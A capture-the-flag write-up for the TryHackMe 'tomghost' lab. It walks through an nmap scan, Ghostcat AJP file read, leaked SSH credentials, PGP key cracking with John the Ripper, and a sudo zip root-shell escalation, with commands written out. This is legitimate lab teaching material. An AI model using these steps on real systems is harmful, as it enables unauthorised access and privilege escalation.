## tomghost - Try Hack Me
Easy box from tryhackme

`export IP=10.10.170.225`

### Overveiw
- **NMAP**
- **AJP**
- **PGP**
- **GPG**

Link to the machine: https://tryhackme.com/room/tomghost



## user.txt

First we do a nmap `nmap -sC -sV @IP`
Output is the following:
```sh
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
|_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
| ajp-methods:
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http       Apache Tomcat 9.0.30
|_http-title: Apache Tomcat/9.0.30
|_http-favicon: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We see that 8009 is open running apj13.
A quick google search tells us this is vulnerable.
Seemes to be a local file inclusion vulnerability called tomghost that we can use.

### Apache JServ Protocol - AJP
Tomcat treats AJP connections as having higher trust than, for example, a similar HTTP connection. If such connections are available to an attacker, they can be exploited.

ExploitDB has a python script that can help us conduct the AJP requests to the server. It is pretty complex, but similar to a HTTP request. We use the script in order to just see if we geta response. When we run the script on the server, it replies witht the following string:

```sh
  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to GhostCat
        skyfuck:8730281lkjlkjdqlksalks
  </description>

```

So we have a username and password. We can use this to log into the server on ssh.

We are in! Then we go to the home folder and `cd` in the `merlin` user. Here we find the user.txt, and we have permission to read it.

`python3 -m http.server 9001`

And then we wget the pgp and gpg files onto our machine. Old switcharoo.





## root.txt

There is a `.asc` file containing a private PGP private Key Block, and a .pgp file that contains some raw data that we cant read.

We can use johntheripper in order to create a hash for this and try to compare it with passwords from rockyou.
We do the ffollowing:
```sh
gpg2john tryhackme.asc > hash2
john --wordlist=/usr/share/wordlists/rockyou.txt --format=gpg hash2
```

And john finds the following password:
`alexandru        (tryhackme)`

This is the gpg password for the user. So we can add the private key to our list:
`gpg --import tryhackme.asc`

Then we supply the password that we just found.
And we can now decrypt the credential.pgp file:

`gpg -d credential.pgp`

- `-d` for decrypt.

We are then presented with the following username and password
`merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j`

After we log into merlin, we try the classic low hangin fruit `sudo -l`
and we see that merlin is allowed to run `zip`.
We then go to gtfobins and find a way to spawn a root shell.


Here are the commands to spawn a root shell:
```sh
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF
```

The first line creates a temporary file or directory, and `-u` makes it not create anything, just printing a name.
Line 2 we use `zip` with `sudo` on that file or directory `TF` with the `/etc/hosts` file. This will create a zipfile called `TF.zip` containing the /etc/hosts file.
Then also in line 2 we do a `-T` and `-TT` which will use command cmd instead of 'unzip -tqq' to test an archive when the -T option is used.
And using the `-T -TT` we follow up with a shell for root using `'sh #'`.
Finally the tmp file/directory is deleted using the `sudo rm`.

We get a root shell and can just cat out the flag.
